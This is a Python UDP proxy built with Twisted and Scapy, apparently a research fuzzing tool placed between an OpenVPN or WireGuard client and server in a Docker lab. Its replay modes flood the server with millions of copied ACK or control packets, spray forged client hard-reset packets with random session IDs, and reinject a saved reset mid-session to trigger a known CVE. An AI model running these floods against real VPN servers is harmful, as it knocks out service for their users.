#! /usr/bin/env python3
from twisted.internet.protocol import DatagramProtocol
from twisted.internet import reactor
from scapy.all import *
import random 
import secrets
import time
import argparse

# edit this to map local port numbers to a list of host:port destinations
# source site: https://distrustsimplicity.net/articles/a-simple-udp-forwarder-in-twisted/

# should first fill in the client_ip, server_ip, replay_select
# "192.168.1.33"
# now we use the same IP as it's in docker
client_ip = "172.17.0.3"
# "192.168.1.155"
server_ip = "172.17.0.3"

# "openvpn" or "wireguard"
test_type = "openvpn"
# 50000 for openvpn and 60000 for wireguard
binding_port = 50000
client_port = 40000
# 1194 for openvpn, 60683 for wireguard for now
server_port = 1194

# "control_v1" "client_restart_v2" "ack_c" "ack_s"
# "ndss_restart" means the forced negotiation crash attack in the ndss 2022 paper
replay_select = "ack_c"
num_replay = 10000000

# this serves for active learning part 
# when the client is the Mac software, it will send one extra last messagem so in total 10, we increase it from 1, 2, 3, 4, 5, 6, 7, 8, 9, 10
# while when the client is built from the source implementation, the client won't send the last message and only 9 in total.
allowed_control_v1_num = 200000
resume_control_v1_num = 20
# 4 only: no effect on server since info is incomplete
# with 5 then the server can verify the client certificate and write finished and the session ticket
# with 6 then server gets the client systematic information and the client part random material for data channel negotiation
# the 7th is from server which is the TLS negotiation success session ticket
# with 8th from server, maybe what matters is the specific ACK from client, then the server will consider TLS finished and send the random material
# with 8th, client will get key material from server, but still needs options from 9th message to generate data channel keys successfully
# only with 9th from server, then the client will generate data channel keys
# but the server will send data channel messages even before the client confirms receiving the 9th control message
control_v1_num = 0

sent_saved_pkt = False

P_CONTROL_HARD_RESET_CLIENT_V2 = 7
P_CONTROL_HARD_RESET_SERVER_V2 = 8 
P_CONTROL_V1 = 4
P_ACK_V1 = 5
P_DATA_V2 = 9

array_opcode = [P_CONTROL_HARD_RESET_CLIENT_V2, P_CONTROL_HARD_RESET_SERVER_V2, P_CONTROL_V1, 
                P_ACK_V1, P_DATA_V2]
OPCODE_MASK = 0b11111000
KEYID_MASK = 0b00000111 

class OpenVPN(Packet):
    name = "OpenVPN"
    fields_desc = [ XByteField("Type", None), XLongField("Session_ID", None), 
                   XByteField("Message_Packet_ID_Array_Lenth", None),
                   StrLenField("Packet_ID_Array", "", length_from = lambda pkt: 4 * pkt.Message_Packet_ID_Array_Lenth),
                    XLongField("Remote_Session_ID", None),
                   XIntField("Message_Packet_ID", None)]  # the Data field will be in Raw field, which is default
    

# Client hard reset does not have remote sid
class CHR(Packet):
    name = "OpenVPN"
    fields_desc = [ XByteField("Type", None), XLongField("Session_ID", None), 
                   XByteField("Message_Packet_ID_Array_Lenth", None),
                   StrLenField("Packet_ID_Array", "", length_from = lambda pkt: 4 * pkt.Message_Packet_ID_Array_Lenth),
                   XIntField("Message_Packet_ID", None)]  # the Data field will be in Raw field, which is default
    
class to_get_op_code(Packet):
    name = "to_get_op_code"
    fields_desc = [XByteField("Type", None)] # it's one byte, while 5 bits for opcode,  3 bits for keyid 



class Forward(DatagramProtocol):
    def datagramReceived(self, data, addr):
        # print(f"the proxy received {data!r} from {addr}")
        # print("the type of data is ", type(data)) # class bytes 
        global client_ip
        global server_ip
        global client_port
        global server_port 
        global saved_pkt
        global sent_saved_pkt

        global num_replay

        global allowed_control_v1_num
        global control_v1_num
        global resume_control_v1_num

        num_replay = args.num_replay
        allowed_control_v1_num = args.allowed_control_v1_num
        resume_control_v1_num = args.resume_control_v1_num


        if test_type == "openvpn":
            to_get_op_code_pkt = to_get_op_code(data)
            togetpacket_type = to_get_op_code_pkt.Type
            toget_opcode = ( togetpacket_type & OPCODE_MASK) >> 3
            # if toget_opcode==7:
            #     openvpn_packet = CHR(data)
            # else:
            #     openvpn_packet = OpenVPN(data)
            # print("We first display the packet fields before modification")
            # openvpn_packet.show() 

            # print("before modifictaion, the type is:", type(openvpn_packet.Type))
            # test if we can change the field values
            # print("We then display the packet fields after modification")
            # packet_type = openvpn_packet.Type
            # type_opcode = ( packet_type & OPCODE_MASK) >> 3
            # type_keyid = ( packet_type & KEYID_MASK)
            # client_session_id = openvpn_packet.Session_ID 
            print(f"the proxy received {len(data)} bytes data opcode {toget_opcode} from {addr}")
            # print("the type of client session id: ", type(client_session_id)) 


            # print("the original opcode: ", type_opcode, " and keyid: ", type_keyid)
            # new_opcode = random.choice(array_opcode)
            # print("the new opcode: ", new_opcode, " and keyid: ", type_keyid)
            # new_type = (new_opcode << 3) | type_keyid
            # print("the new type: ", new_type)
    
    #        openvpn_packet.Type = new_type
            # print("the type modified is: ", type(openvpn_packet.Type))
            # openvpn_packet.Session_ID = 0
            # openvpn_packet.Message_Packet_ID_Array_Lenth =0
            # openvpn_packet.Message_Packet_ID = 0
            # openvpn_packet[Raw].load = 0
    #        openvpn_packet.show()
       
            bytes_opacket = bytes(to_get_op_code_pkt)
       
        # if the packet is from the client 
            if addr[1]!=1194:
                # should record the port on which the client is on
                client_port = addr[1]
                
                # if it's not a control_v1 packet, send casually
                if toget_opcode!= 0x04:
                    if toget_opcode==0x05: # ACK
                        # openvpn_packet.show()
                        print("**************** we got an ACK packet  *****************")
                       # openvpn_packet.Session_ID = 4669467424213927853    
                        to_get_op_code_pkt.show()
                    self.transport.write(bytes_opacket, (server_ip, 1194))

                    # print(f"the proxy sent {bytes_opacket!r} to server:1194")
                    print(f"sent the original {len(bytes_opacket)} bytes packet to server: 1194")

                # we control a certain number of p_control_v1 packets to be exchanged so that we know the progress
                # and we can map concrete messgaes to the log in vpn
                else:
                    control_v1_num+=1
                    # if control_v1_num == 1:
                    #     bytes_opacket += b"z" * 5000 # we create the very large control packet
                    #     # print("we send a control v1 pkt with 5000bytes payload", len(bytes_opacket))
                       

                    if control_v1_num <= allowed_control_v1_num or control_v1_num > resume_control_v1_num:
                        self.transport.write(bytes_opacket, (server_ip, 1194))
                       
                        print("the allowed control v1 num:", allowed_control_v1_num)
                        print(f"sent the {control_v1_num}th control_v1 packet {len(bytes_opacket)} bytes to server: 1194")
                        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                    # else we have reached the allowed_control_v1_num
                    else:
                        print("we delibrately stop sending control_v1 packets to monitor the log progress", control_v1_num, resume_control_v1_num)
                        # print("the message packet id is", openvpn_packet.Message_Packet_ID)


                # if the pkt is Client_hard_reset_v2, we generate 100 such pkts to see the effects
                if toget_opcode == 0x07 and args.fuzzway == "replay" and args.pkt == "client_restart_v2":
                    print("we got the initial pkt from client, will start sending 100 copies of it")
                    for i in range(100):
                        new_pkt = to_get_op_code_pkt
                        # create a new random 8 byte client session ID in the type of int
                        # print("SHOULD DEBUG SETTING THE NEW RANDOM SESSION ID.....")
                        new_pkt.Session_ID = int.from_bytes(secrets.token_bytes(8), byteorder='big')
                        self.transport.write(bytes(new_pkt), (server_ip, 1194))
                        # print("sent a new packet with randomly-created client session_id to server: 1194")

                if toget_opcode == 0x05 and args.fuzzway == "replay" and args.pkt == "ack_c":
                    print("we got an ack packet from client")
                    new_pkt = to_get_op_code_pkt
                    bytes_new_pkt = bytes(new_pkt)
                    len_bytes_new_pkt = len(bytes_new_pkt)
                    start_time = time.time() 
                    total_bytes_sent = 0 

                    print(f"Below we will send {num_replay} copies of {len_bytes_new_pkt}-bytes ack pkt to server: 1194")
                    for i in range(num_replay): # 100000 for ack_c no tls-auth, 100000 for tls-auth
                        self.transport.write(bytes_new_pkt, (server_ip, 1194))
                        total_bytes_sent += len_bytes_new_pkt
                        # print("sent a copy of ack packet to server")
                        
                        if i==1000:
                            print("we measure the sending rate when 1000 packets are sent")
                            end_time = time.time() 
                            total_time = end_time - start_time
                            if total_time > 0:  
                                bytes_per_second = total_bytes_sent / total_time  
                                print(f"Total bytes sent: {total_bytes_sent} bytes in {total_time:.2f} seconds.")
                                print(f"Bytes per second: {bytes_per_second:.2f} bytes/sec")
      

                if toget_opcode == 0x04 and args.fuzzway == "replay" and args.pkt == "control_v1":
                    print("we got the p_control_v1 pkt from client")
                    new_pkt = to_get_op_code_pkt
                    bytes_new_pkt = bytes(new_pkt)
                    len_bytes_new_pkt = len(bytes_new_pkt)
                    start_time = time.time() 
                    total_bytes_sent = 0 

                    print(f"Below we will send {num_replay} copies of {len_bytes_new_pkt}-bytes p_control_v1 pkt to server: 1194")
                    for i in range(num_replay): # 1000 for no tls-auth, 100000 for tls-auth
                        # simply replay the p_control_v1 pkt since it won't be checked with rate limit
                        self.transport.write(bytes_new_pkt, (server_ip, 1194))
                        total_bytes_sent += len_bytes_new_pkt
                        
                        if i==1000:
                            print("we measure the sending rate when 1000 packets are sent")
                            end_time = time.time() 
                            total_time = end_time - start_time
                            if total_time > 0:  
                                bytes_per_second = total_bytes_sent / total_time  
                                print(f"Total bytes sent: {total_bytes_sent} bytes in {total_time:.2f} seconds.")
                                print(f"Bytes per second: {bytes_per_second:.2f} bytes/sec")

                
                   
                # try the ndss cve, i.e., sending a single restart to server during normal connection
                if toget_opcode == 0x07 and args.fuzzway == "replay" and args.pkt == "ndss_restart":
                    saved_pkt = to_get_op_code_pkt # after the tunnel is made, send it to trigger the cve
                    sent_saved_pkt = False # mark false for now 

                if toget_opcode == 0x09 and args.fuzzway == "replay" and args.pkt == "ndss_restart":
                    if sent_saved_pkt == False: # only send it once, since it's udp, we try 5 pkts
                        for i in range(5):
                            saved_pkt.show()
                            self.transport.write(bytes(saved_pkt), (server_ip, 1194))
                            print("sent an additional client restart pkt to server to trigger its response, cve from ndss 2022 paper")
                        sent_saved_pkt = True  


            # else must be a reply from the server on 1194
            elif addr[1] == 1194:
                if toget_opcode == 0x08:
                    print("the server replied a hard reset packet")

                # if it's not a control_v1 packet, send casually
                if toget_opcode!= 0x04:
                    if toget_opcode==0x05: # ACK
                        print("**************** we got an ACK packet *****************")
                        # openvpn_packet.show()

                    self.transport.write(bytes_opacket, (client_ip, client_port))
                    # print(f"the proxy sent {bytes_opacket!r} to client:", client_port)
                    print(f"sent the original {len(bytes_opacket)} bytes packet to client:", client_port)

                # we control the allowed control_v1 packets sent out
                else: 
                    control_v1_num += 1
                    if control_v1_num <= allowed_control_v1_num or control_v1_num > resume_control_v1_num:
                        self.transport.write(bytes_opacket, (client_ip, client_port))
                        print(f"sent the {control_v1_num}th {len(bytes_opacket)} bytes opcode {toget_opcode} control_v1 packet to client:", client_port)
                        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                    else:
                        print("we delibrately stop sending control_v1 packets to monitor the log progress", control_v1_num, resume_control_v1_num)

        elif test_type=="wireguard":
            print("~~~~~~~~~~~~~~ we are proxy for wireguard ~~~~~~~~~~")
            if addr[0] == client_ip: # from client
                client_port = addr[1]
                self.transport.write(data, (server_ip, server_port))
                print(f"sent the original {len(data)} bytes packet to server:", server_port)
                
            elif addr[0] == server_ip: # from server 
                self.transport.write(data, (client_ip, client_port))
                print(f"sent the original {len(data)} bytes packet to client:", client_port)
                
    
def main():   
    parser = argparse.ArgumentParser(description="Parse the fuzzing selection")
    parser.add_argument("--fuzzway", type=str, help="the selected fuzzing way", default="None")
    parser.add_argument("--pkt", type=str, help="the selected pkt to fuzz", default="None")
    parser.add_argument("--field", type=str, help="the selectd field to fuzz", default="None")
    parser.add_argument("--howto", type=str, help="how to change the field value", default="None")
    parser.add_argument("--bunch", type=str, help="the selected bunch of messages to reorder", default="None")

    parser.add_argument("--num_replay", type=int, help="the num of replay", default=10000000)
    parser.add_argument("--allowed_control_v1_num", type=int, help="the threshold of allowed control_v1 pkt num", default=200000)
    parser.add_argument("--resume_control_v1_num", type=int, help="the threshold of control_v1 pkt num to resume sending", default=20000)

    global args 
    args = parser.parse_args()
   

    reactor.listenUDP(binding_port, Forward())
    reactor.run()


if __name__ == "__main__":
    main()
